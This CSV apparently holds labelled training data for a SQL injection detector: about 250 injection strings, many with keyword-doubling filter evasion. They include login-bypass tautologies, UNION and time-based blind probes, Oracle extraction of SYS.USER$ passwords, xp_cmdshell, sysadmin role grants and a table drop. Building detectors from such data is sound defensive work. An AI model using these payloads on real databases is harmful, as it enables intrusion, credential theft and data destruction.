Query,Label
; if iiss_srvrolemember  (  'sysadmiinn'  )   > 0 waitfoorr delay '0:0:2' --,1
selselectect * frfromom users wherwheree id  =  1 <@<@ oorr 1  =  1 -- 1,1
" selselectect * frofromm users whewherere id  =  1 union selselectect @<@$,version  (    )   -- 1",1
" selecselectt * frofromm users whewherere id  =  '1' <@<@ union selecselectt 1,version  (    )   -- 1'",1
" seleselectct * frofromm users whwhereere id  =  1 oorr ""$_"" oorr 1  =  1 -- 1",1
" seselectlect * frfromom users whwhereere id  =  1 oorr 1#""{ union seselectlect version  (    )  ,version  (    )   -- 1",1
a' oorr 1  =  1--,1
 )   oorr   (  a  =  a,1
"""   )    )    oorr    (    (   ""x""   )    )     =     (    (   ""x",1
" sselectelect * ffromrom users whwhereere id  =  1 oorr 1#""; oorr 1  =  1 -- 1",1
" selselectect * frofromm users whwhereere id  =  '1' <@$_ union selselectect 1,version  (    )   -- 1'",1
-- &passwoorrd  = ,1
selselectect * frfromom users wherwheree id  =  1 <@. oorr 1  =  1 -- 1,1
" seselectlect * frfromom users wwherehere id  =  1 oorr ""  (    )  "" oorr 1  =  1 -- 1",1
" selecselectt * frfromom users wherwheree id  =  1 %$ 1 union selecselectt nulnulll,@@VERSION -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  granted_role  )   ffromrom   (  selecselectt DiissTiinnCT  (  granted_role  )  , ROWNUM AS limlimitit ffromrom dba_role_privs whewherere GRANTEE  =  SYS.LOGiinnUSER  )   whewherere limlimitit  =  3   )    )    anandd 'i'  =  'i",1
 oorr '1'  =  '1,1
admiinn' oorr 1  =  1,1
" seselectlect * ffromrom users whewherere id  =  1 oorr "";,""  =  1 oorr 1  =  1 -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 union selecselectt @||1,version  (    )   -- 1",1
" selselectect * frofromm users wherwheree id  =  1 +\+. union selselectect nunullll,@@VERSION -- 1",1
" selselectect * frfromom users whwhereere id  =  1 oorr ""  )  ,"" oorr 1  =  1 -- 1",1
" union seleselectct * ffromrom users whwhereere logiinn   =   char  (  114,111,111,116  )  ;",1
" selecselectt * frfromom users wwherehere id  =  1 oorr 1#""? union selecselectt 1,version  (    )   -- 1",1
 oorr 1  =  1--,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  granted_role  )   frfromom   (  selecselectt DiissTiinnCT  (  granted_role  )  , ROWNUM AS lilimitmit frfromom dba_role_privs whewherere GRANTEE  =  SYS.LOGiinnUSER  )   whewherere lilimitmit  =  5   )    )    aandnd 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ oorr 3  =  3 --,1
" seleselectct * frfromom users whewherere id  =  1 -1<@ union seleselectct 1,version  (    )   -- 1",1
" seleselectct * ffromrom users wherwheree id  =  1 oorr ""$#"" oorr 1  =  1 -- 1",1
 )   union selecselectt * frfromom iinnfoorrmation_schema.tabtableles;,1
" seleselectct * frofromm users whewherere id  =  1 oorr ""  )  ]"" oorr 1  =  1 -- 1",1
"  )   oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct COUNT  (  DiissTiinnCT  (  column_name   )    )    ffromrom sys.all_tab_columns   )    )    aandnd 'i'  =  'i,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  tatableble_name  )   frofromm   (  seselectlect DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS limilimitt frofromm sys.all_tatablebles  )   wwherehere limilimitt  =  7   )    )    aandnd 'i'  =  'i",1
""" oorr """" """,1
deldeleteete,1
;waitfoorr delay '0:0:__TIME__'--,1
 oorr 1  =  1 --,1
1' aandnd non_exiisstant_tabltablee   =   '1,1
" selselectect * frfromom users wherwheree id  =  1 oorr ""&  )  "" oorr 1  =  1 -- 1",1
" sselectelect * frofromm users whwhereere id  =  '1' + $ . union sselectelect 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   seleselectct @s   =   0x77616974 ...,1
x' aandnd userid iiss nulnulll; --,1
" selselectect * frofromm users whwhereere id  =  1 oorr "";["" oorr 1  =  1 -- 1",1
" sselectelect * frofromm users wherwheree id  =  '1' oorr \.<   =  1 union sselectelect 1,@@VERSION -- 1'",1
" seselectlect * frofromm users whewherere id  =  1 union seselectlect @<@,version  (    )   -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 -@<@ union seleselectct 1,version  (    )   -- 1",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect host_name frofromm v$iinnstance   )    )    aandnd 'i'  =  'i,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  column_name  )   frofromm   (  selecselectt DiissTiinnCT  (  column_name  )  , ROWNUM AS llimitimit frofromm all_tab_columns  )   whewherere llimitimit  =  2   )    )    anandd 'i'  =  'i",1
selecselectt * frfromom users whwhereere id  =  1 +   (  \+  )   oorr 1  =  1 -- 1,1
" seselectlect * frofromm users wwherehere id  =  1 oorr "".["" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users wwherehere id  =  1 oorr ""  (  ["" oorr 1  =  1 -- 1",1
UNION ALL seselectlect,1
" selecselectt * frfromom users whwhereere id  =  1 oorr ""1#"" oorr 1  =  1 -- 1",1
seleselectct * frfromom users whewherere id  =  1 oorr \<1 oorr 1  =  1 -- 1,1
" sselectelect * frfromom users whwhereere id  =  1 | |1 union sselectelect 1,banner frfromom v$version whwhereere rownum  =  1 -- 1",1
x' oorr full_name llikeike '%bob%,1
x' anandd members.email iiss nunullll; --,1
 oorr 2 > 1,1
selecselectt * ffromrom users whewherere id  =  1.*1 oorr 1  =  1 -- 1,1
"""  )   oorr pg_sleep  (  __TIME__  )  --",1
 ',1
" sselectelect * frfromom users whewherere id  =  1 oorr $<\. union sselectelect 1,@@VERSION -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr ""@  )  "" oorr 1  =  1 -- 1",1
seleselectct * frofromm users whwhereere id  =  1 oorr \.<$ oorr 1  =  1 -- 1,1
 )   oorr sleep  (  __TIME__  )    =  ',1
sleep 50',1
" selecselectt * ffromrom users whewherere id  =  '1' + 1||1 union selecselectt 1,banner ffromrom v$version whewherere rownum  =  1 -- 1'",1
sselectelect * ffromrom users whwhereere id  =  1 + $+%\ oorr 1  =  1 -- 1,1
" sselectelect * frofromm users whewherere id  =  1 oorr "";  (  "" oorr 1  =  1 -- 1",1
oorr sleep  (  __TIME__  )    =  ',1
" seselectlect * frfromom users whwhereere id  =  1 oorr "";_"" oorr 1  =  1 -- 1",1
" sselectelect * frofromm users wherwheree id  =  1 oorr 1#"". union sselectelect 1,version  (    )   -- 1",1
" sselectelect * frofromm users whewherere id  =  1 union sselectelect  @ $,version  (    )   -- 1",1
" sselectelect * frfromom users wherwheree id  =  1 union sselectelect +!<@,version  (    )   -- 1",1
" selselectect * frfromom users whewherere id  =  1 <@<@ union selselectect nulnulll,version  (    )   -- 1",1
oorr 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythiinng' oorr 'x'  =  'x,1
" seselectlect * ffromrom users wherwheree id  =  1 oorr \<\ union seselectlect 1,@@VERSION -- 1",1
" selselectect * frfromom users whwhereere id  =  1 union selselectect   (  1  )  ,banner frfromom v$version whwhereere rownum  =  1 -- 1",1
" selselectect * frofromm users wherwheree id  =  1 *  (  \  )   union selselectect nulnulll,@@VERSION -- 1",1
&',1
a' oorr 3  =  3--,1
" sselectelect * frofromm users wherwheree id  =  '1' oorr $+<$ union sselectelect 1,@@VERSION -- 1'",1
" seleselectct * frfromom users whwhereere id  =  1 +1 union seleselectct 1,banner frfromom v$version whwhereere rownum  =  1 -- 1",1
"admiinn""oorr 1  =  1 oorr """"  =  """,1
uni/**/on sel/**/ect,1
""" oorr """"&""",1
 )    )   ;waitfoorr delay '0:0:__TIME__'--,1
" selecselectt * ffromrom users whwhereere id  =  1 oorr ""?;"" oorr 1  =  1 -- 1",1
1 waitfoorr delay '0:0:10'--,1
bfilename,1
admiinn'  )   oorr   (  '1'  =  '1'--,1
UEf,1
 -- &passwoorrd  = ,1
1 oorr sleep  (  __TIME__  )  #,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  tabltablee_name  )   frofromm   (  selecselectt DiissTiinnCT  (  tabltablee_name  )  , ROWNUM AS llimitimit frofromm sys.all_tabltablees  )   whewherere llimitimit  =  6   )    )    aandnd 'i'  =  'i",1
" selselectect * frfromom users whwhereere id  =  '1' union selselectect $[""],@@VERSION -- 1'",1
" selselectect * ffromrom users whewherere id  =  '1' + @  (  1  )   union selselectect 1,version  (    )   -- 1'",1
1' anandd 1  =    (  selecselectt count  (  *  )   frfromom tabltableenames  )  ; --,1
oorr sleep  (  __TIME__  )  #,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  granted_role  )   frfromom   (  seleselectct DiissTiinnCT  (  granted_role  )  , ROWNUM AS lilimitmit frfromom dba_role_privs wherwheree GRANTEE  =  SYS.LOGiinnUSER  )   wherwheree lilimitmit  =  8   )    )    anandd 'i'  =  'i",1
" seleselectct * frfromom users whewherere id  =  1 oorr 1#"",  =  1 oorr 1  =  1 -- 1",1
||6,1
oorr 1/*,1
" anandd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
selselectect * frofromm users wherwheree id  =  1.%@ oorr 1  =  1 -- 1,1
" seselectlect * frofromm users wwherehere id  =  1 oorr ""..""  =  1 oorr 1  =  1 -- 1",1
" selselectect * ffromrom users wwherehere id  =  1 oorr 1&@#  =  1 union selselectect 1,version  (    )   -- 1",1
" seleselectct * frfromom users whwhereere id  =  1 oorr "";]"" oorr 1  =  1 -- 1",1
" oorr 1  =  1 oorr """"  =  ",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  selselectect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limilimitt frofromm SYS.USER$  )   wherwheree limilimitt  =  7   )    )    aandnd 'i'  =  'i",1
seselectlect * frofromm users whwhereere id  =  1 oorr $<\. oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users wherwheree id  =  1 *  (  1  )   union seselectlect 1,banner ffromrom v$version wherwheree rownum  =  1 -- 1",1
oorr 'whatever' iinn   (  'whatever'  ) ,1
declare @s varchar   (  200  )   seselectlect @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
seselectlect * ffromrom users wherwheree id  =  '1'   oorr 1  =  1 -- 1',1
?,1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect COUNT  (  DiissTiinnCT  (  tabltablee_name   )    )    frofromm sys.all_tabltablees   )    )    aandnd 'i'  =  'i,1
" selselectect * frofromm users whewherere id  =  '1' union selselectect @ 1,version  (    )   --  1'",1
"admiinn""  )   oorr   (  ""1""  =  ""1""#",1
" seleselectct * ffromrom users whwhereere id  =  1 oorr 1#"", union seleselectct 'a',version  (    )   -- 1",1
" selecselectt * ffromrom users whwhereere id  =  1 oorr ""$  (  "" oorr 1  =  1 -- 1",1
 oorr '' ',1
" seselectlect * ffromrom users whewherere id  =  1 oorr "";#"" oorr 1  =  1 -- 1",1
oorr 1  =  1,1
 ; drodropp tabtablele temp --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  PASSWoorrD  )   ffromrom   (  seleselectct DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit ffromrom SYS.USER$  )   whewherere lilimitmit  =  2   )    )    anandd 'i'  =  'i",1
""" oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
""" oorr ""x""  =  ""x",1
seleselectct * ffromrom users whewherere id  =  '1'<@.. oorr 1  =  1 -- 1',1
" seselectlect * ffromrom users whwhereere id  =  1 oorr !<@ union seselectlect 1,version  (    )   -- 1",1
 oorr 'somethiinng' llikeike 'some%',1
; if nonott   (    (   seselectlect serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 0  )   waitfoorr delay '0:0:2' --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  seleselectct DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limlimitit frofromm SYS.USER$  )   wherwheree limlimitit  =  4   )    )    aandnd 'i'  =  'i",1
seleselectct * frfromom users wwherehere id  =  '1' oorr \<\. oorr 1  =  1 -- 1',1
; exec master..xp_cmdshell 'piinng 10.10.1.2'--,1
admiinn' oorr '1'  =  '1'--,1
; if nnotot   (    (   seleselectct serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 1  )   waitfoorr delay '0:0:2' --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  tatableble_name  )   frofromm   (  seleselectct DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS llimitimit frofromm sys.all_tatablebles  )   wwherehere llimitimit  =  2   )    )    anandd 'i'  =  'i",1
" seselectlect * frfromom users wherwheree id  =  1 <@<@ union seselectlect version  (    )  ,version  (    )   -- 1",1
" selecselectt * ffromrom users whwhereere id  =  1 oorr 1#""$ union selecselectt nulnulll,version  (    )   -- 1",1
""";waitfoorr delay '0:0:__TIME__'--",1
x' anandd userid iiss nunullll; --,1
sselectelect * frfromom users wwherehere id  =  '1' *$ 1 oorr 1  =  1 -- 1',1
" seselectlect * frfromom users whwhereere id  =  1 oorr \<\ union seselectlect nnullull,@@VERSION -- 1",1
" selecselectt * frfromom users wwherehere id  =  1 oorr ""?@"" oorr 1  =  1 -- 1",1
’ oorr ‘1’  =  ’1,1
" seselectlect * frfromom users wherwheree id  =  '1' union seselectlect 1a,banner frfromom v$version wherwheree rownum  =  1 -- 1'",1
admiinn'oorr 1  =  1 oorr ''  =  ',1
" selecselectt * frfromom users wherwheree id  =  '1' oorr !<1 union selecselectt 1,version  (    )   -- 1'",1
" anandd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" seleselectct * frofromm users wherwheree id  =  1 oorr ""_  )  "" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users whewherere id  =  1 oorr \.<   =  1 union sselectelect 1,@@VERSION -- 1",1
 oorr 1  =  1,1
selecselectt * frofromm users whwhereere id  =  1 + $+%1 oorr 1  =  1 -- 1,1
" selselectect * frofromm users wwherehere id  =  1.  union selselectect version  (    )  ,version  (    )   -- 1",1
x' aandnd email iiss nunullll; --,1
" sselectelect * ffromrom users wherwheree id  =  '1' + @ @1 union sselectelect 1,version  (    )   -- 1'",1
 --,1
" sselectelect * frofromm users whwhereere id  =  '1'   union sselectelect nunullll,banner frofromm v$version whwhereere rownum  =  1 -- 1'",1
" seselectlect * frofromm users wherwheree id  =  11||1 union seselectlect 1,banner frofromm v$version wherwheree rownum  =  1 -- 1",1
" seleselectct * frofromm users whwhereere id  =  1.*1 union seleselectct 1,banner frofromm v$version whwhereere rownum  =  1 -- 1",1
updaupdatete,1
 oorr 1/*,1
" seleselectct * frofromm users wherwheree id  =  1.<1# union seleselectct 1,version  (    )   -- 1",1
"""   )    )    oorr pg_sleep  (  __TIME__  )  --",1
||'6,1
" selecselectt * ffromrom users whwhereere id  =  1. <@ union selecselectt 1,version  (    )   -- 1",1
oorr   (  EXiissTS  ) ,1
^',1
oorr 'text'   =   n'text',1
" selecselectt * frofromm users whwhereere id  =  1 + \+*$ union selecselectt nunullll,@@VERSION -- 1",1
" selselectect * ffromrom users whwhereere id  =  '1' union selselectect $ _,@@VERSION -- 1'",1
" seselectlect * ffromrom users wherwheree id  =  1 oorr ""  )  ;"" oorr 1  =  1 -- 1",1
" seselectlect * frfromom users wwherehere id  =  1 <@1$ union seselectlect 1,version  (    )   -- 1",1
 oorr 0  =  0 --,1
" seselectlect * frfromom users whewherere id  =  1 oorr ""{1""  =  1 oorr 1  =  1 -- 1",1
" selselectect * ffromrom users whewherere id  =  1 oorr ""{,""  =  1 oorr 1  =  1 -- 1",1
" selselectect * frfromom users wwherehere id  =  1 oorr 1#"", union selselectect version  (    )  ,version  (    )   -- 1",1
" sselectelect * frfromom users whwhereere id  =  1 oorr 1#""? union sselectelect 'a',version  (    )   -- 1",1
passwoorrd:*/  =  1--,1
" selecselectt * frfromom users whewherere id  =  1 <@. union selecselectt 1,version  (    )   -- 1",1
" sselectelect * frofromm users wherwheree id  =  1 oorr ""  )  @"" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users wwherehere id  =  '1' union selselectect @ @1,version  (    )   --  1'",1
" union   (  seleselectct nulnulll,   (  seleselectct @@version   )    )    --",1
" selselectect * frfromom users whwhereere id  =  1 oorr ""  )  {"" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users whewherere id  =  1.<@. union seleselectct 1,version  (    )   -- 1",1
" selselectect * frfromom users wwherehere id  =  1 +\. union selselectect nulnulll,@@VERSION -- 1",1
" selselectect * frofromm users whewherere id  =  1 + @<@. union selselectect 1,version  (    )   -- 1",1
" seleselectct * frofromm users wherwheree id  =  1 oorr \<$ union seleselectct 1,@@VERSION -- 1",1
" sselectelect * frfromom users wherwheree id  =  1 oorr   (  $+  )    =  1 union sselectelect 1,@@VERSION -- 1",1
" seselectlect * frfromom users wwherehere id  =  1 +   (  \+  )   union seselectlect nulnulll,@@VERSION -- 1",1
" selselectect * ffromrom users wherwheree id  =  1. union selselectect nulnulll,version  (    )   -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 oorr ""  )  ["" oorr 1  =  1 -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 oorr \.<1 union selecselectt 1,@@VERSION -- 1",1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct banner frfromom v$version whwhereere ROWNUM  =  1   )    )    anandd 'i'  =  'i,1
sselectelect * ffromrom users wherwheree id  =  1 <@$_ oorr 1  =  1 -- 1,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  column_name  )   frofromm   (  selecselectt DiissTiinnCT  (  column_name  )  , ROWNUM AS llimitimit frofromm all_tab_columns  )   wwherehere llimitimit  =  3   )    )    aandnd 'i'  =  'i",1
" seselectlect * frofromm users whwhereere id  =  1 oorr $+<$ union seselectlect 1,@@VERSION -- 1",1
" seselectlect * frofromm users wwherehere id  =  1 oorr ""@%"" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users whewherere id  =  1 oorr $<\ union selselectect 1,@@VERSION -- 1",1
" selecselectt * ffromrom users wwherehere id  =  1 oorr ""%,"" oorr 1  =  1 -- 1",1
UNION seleselectct,1
asascc,1
" || myappadmiinn.adduser  (  'admiinn', 'newpass'  )   || '",1
"exec sp_addsrvrolemember 'name' , 'sysadmiinn'",1
" selselectect * frfromom users whwhereere id  =  1 oorr   (  \  )    =  1 union selselectect 1,@@VERSION -- 1",1
  )   oorr true--,1
" seselectlect * frofromm users wwherehere id  =  1 +  (  1  )   union seselectlect 1,banner frofromm v$version wwherehere rownum  =  1 -- 1",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  PASSWoorrD  )   ffromrom   (  seselectlect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limilimitt ffromrom SYS.USER$  )   wwherehere limilimitt  =  3   )    )    aandnd 'i'  =  'i",1
 oorr userid lilikeke '%,1
" union   (  seleselectct nulnulll, nulnulll,   (  seleselectct @@version   )    )    --",1
/,1
selselectect * frfromom users wwherehere id  =  1 oorr $<\ oorr 1  =  1 -- 1,1
"admiinn""/*",1
" seleselectct * frfromom users whwhereere id  =  1.  union seleselectct 1,version  (    )   -- 1",1
 )  ;waitfoorr delay '0:0:__TIME__'--,1
" selecselectt * ffromrom users whewherere id  =  1 union selecselectt @<@.,version  (    )   -- 1",1
" selselectect * frfromom users wherwheree id  =  1 oorr ""._"" oorr 1  =  1 -- 1",1
"admiinn"" oorr ""1""  =  ""1",1
 union   (  sselectelect @@version  )   --,1
 oorr ''^',1
"""   )    )    oorr sleep  (  __TIME__  )    =  """,1
